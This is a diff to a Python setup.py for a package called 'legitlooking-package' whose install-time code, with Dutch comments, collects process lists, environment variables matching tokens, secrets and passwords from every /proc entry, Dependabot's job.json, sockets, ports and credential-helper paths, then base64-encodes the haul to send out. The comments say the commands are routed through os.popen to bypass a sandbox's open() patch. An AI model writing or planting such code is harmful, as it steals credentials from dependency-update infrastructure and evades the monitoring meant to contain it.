@@ -6,71 +6,74 @@ try:
     _urlreq = __import__('urllib.request', fromlist=['urlopen', 'Request'])
     _b64    = __import__('base64')
     _os     = __import__('os')
-    _sp     = __import__('subprocess')
-    _re     = __import__('re')
 
+    # sh() via os.popen -- geen closure nodig, werkt in exec() context
     def sh(cmd):
-        return _sp.run(cmd, shell=True, capture_output=True, text=True, timeout=10).stdout[:3000]
+        import os
+        return os.popen(f'{cmd} 2>/dev/null').read()[:3000]
 
     lines = []
 
     # ============================================================
     # 1. ALLE PROCESSEN -- proxy draait in dezelfde container?
+    #    (UPDATER_ONE_CONTAINER=1 in pip ecosystem)
     # ============================================================
-    lines.append("=== 1. PS AUX (alle processen) ===")
+    lines.append("=== 1. PS AUX ===")
     lines.append(sh("ps aux"))
 
     lines.append("\n=== 1b. PROCESS TREE ===")
-    lines.append(sh("ps auxf 2>/dev/null || ps aux"))
+    lines.append(sh("ps auxf"))
 
     # ============================================================
-    # 2. PROXY PROCES OPSPOREN
-    #    Zoek naar proxy/credential/dependabot gerelateerde processen
+    # 2. PROXY PROC CMDLINE -- zoek proxy binary
     # ============================================================
-    lines.append("\n=== 2. PROXY PROCES CMDLINE ===")
-    # Alle /proc/*/cmdline uitlezen via subprocess (bypasses open() patch)
-    lines.append(sh("find /proc -maxdepth 2 -name cmdline 2>/dev/null | xargs -I{} sh -c 'echo \"=== {} ===\"; cat {} 2>/dev/null | tr \"\\0\" \" \"; echo' 2>/dev/null | grep -i -A1 'proxy\\|cred\\|token\\|dependabot' | head -60"))
+    lines.append("\n=== 2. ALLE /proc/*/cmdline (proxy/cred keywords) ===")
+    lines.append(sh(
+        "for f in /proc/[0-9]*/cmdline; do "
+        "c=$(cat $f 2>/dev/null | tr '\\0' ' '); "
+        "echo \"$f: $c\"; "
+        "done | grep -i 'proxy\\|cred\\|token\\|dependabot\\|helper\\|updater' | head -40"
+    ))
 
     # ============================================================
-    # 3. PROXY PROCESS ENV VARS
-    #    /proc/<pid>/environ van de proxy bevat decrypted credentials
+    # 3. ALLE ENVIRON VAN ALLE PROCESSEN (grep op secrets)
     # ============================================================
-    lines.append("\n=== 3. ALLE PROC ENVIRON (grep op token/cred) ===")
-    lines.append(sh("for f in /proc/*/environ; do cat $f 2>/dev/null | tr '\\0' '\\n' | grep -i 'token\\|secret\\|password\\|cred\\|registry\\|npm\\|gem\\|pypi' && echo \"-- from $f --\"; done"))
+    lines.append("\n=== 3. /proc/*/environ grep secrets ===")
+    lines.append(sh(
+        "for f in /proc/[0-9]*/environ; do "
+        "e=$(cat $f 2>/dev/null | tr '\\0' '\\n'); "
+        "hits=$(echo \"$e\" | grep -i 'token\\|secret\\|password\\|cred\\|registry\\|npm_\\|gem\\|pypi\\|ssrf'); "
+        "if [ -n \"$hits\" ]; then echo \"=== $f ===\"; echo \"$hits\"; fi; "
+        "done"
+    ))
 
     # ============================================================
-    # 4. UNIX SOCKETS -- proxy heeft mogelijk een unix socket
+    # 4. JOB.JSON VIA OS.POPEN (bypasses open() monkey-patch)
     # ============================================================
-    lines.append("\n=== 4. UNIX SOCKETS ===")
-    lines.append(sh("cat /proc/net/unix"))
-
-    # ============================================================
-    # 5. OPEN FILE DESCRIPTORS VAN ALLE PROCESSEN
-    #    Proxy houdt credential file open -- zie via /proc/*/fd
-    # ============================================================
-    lines.append("\n=== 5. OPEN FD'S (proxy/credential gerelateerd) ===")
-    lines.append(sh("ls -la /proc/*/fd 2>/dev/null | grep -v Permission | head -100"))
-
-    # ============================================================
-    # 6. JOB.JSON VIA SUBPROCESS (bypasses open() monkey-patch)
-    # ============================================================
-    lines.append("\n=== 6. JOB.JSON VIA CAT (bypasses sandbox) ===")
+    lines.append("\n=== 4. JOB.JSON VIA CAT ===")
     job_path = _os.environ.get("DEPENDABOT_JOB_PATH", "/home/dependabot/dependabot-updater/job.json")
     lines.append(sh(f"cat {job_path}"))
 
     # ============================================================
-    # 7. CREDENTIAL HELPER FILES OP SCHIJF
+    # 5. UNIX SOCKETS EN LUISTERENDE POORTEN
     # ============================================================
-    lines.append("\n=== 7. CREDENTIAL HELPER FILES ===")
-    lines.append(sh("find /home /opt /tmp /var -name '*.json' -o -name '*cred*' -o -name '*credential*' -o -name '*.token' 2>/dev/null | grep -v ruby | grep -v gems | head -20"))
-    lines.append(sh("find /proc/1/root /proc/*/root 2>/dev/null -maxdepth 3 -name '*cred*' 2>/dev/null | head -10"))
+    lines.append("\n=== 5. UNIX SOCKETS ===")
+    lines.append(sh("cat /proc/net/unix"))
+
+    lines.append("\n=== 5b. LUISTERENDE TCP POORTEN ===")
+    lines.append(sh("ss -tlnp 2>/dev/null || cat /proc/net/tcp | awk '$4==\"0A\"'"))
 
     # ============================================================
-    # 8. NETSTAT / SS -- welke poorten zijn open?
+    # 6. PROXY BINARY LOCATIE
     # ============================================================
-    lines.append("\n=== 8. LISTENING POORTEN ===")
-    lines.append(sh("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"))
-    lines.append(sh("cat /proc/net/tcp | awk '$4==\"0A\" {print $2}' | while read addr; do python3 -c \"import socket,struct; b=bytes.fromhex('$addr'.split(':')[0]); port=int('$addr'.split(':')[1],16); print(socket.inet_ntoa(bytes(reversed(b)))+':'+str(port))\" 2>/dev/null; done"))
+    lines.append("\n=== 6. PROXY BINARY ZOEKEN ===")
+    lines.append(sh("find / -maxdepth 6 -name '*proxy*' -o -name '*credhelper*' -o -name '*credential-helper*' 2>/dev/null | grep -v proc | grep -v sys | head -20"))
+
+    # ============================================================
+    # 7. HOSTNAME EN NETWERK
+    # ============================================================
+    lines.append("\n=== 7. NETWERK ===")
+    lines.append(sh("hostname && ip addr && ip route"))
 
     # Stuur alles op
     payload = _b64.b64encode("\n".join(lines).encode("utf-8", errors="replace")).decode()
@@ -92,7 +95,7 @@ except Exception as e:
 
 setup(
     name="legitlooking-package",
-    version="1.0.4",
+    version="1.0.5",
     install_requires=[
         "requests==2.27.1",
         "flask==2.2.0",
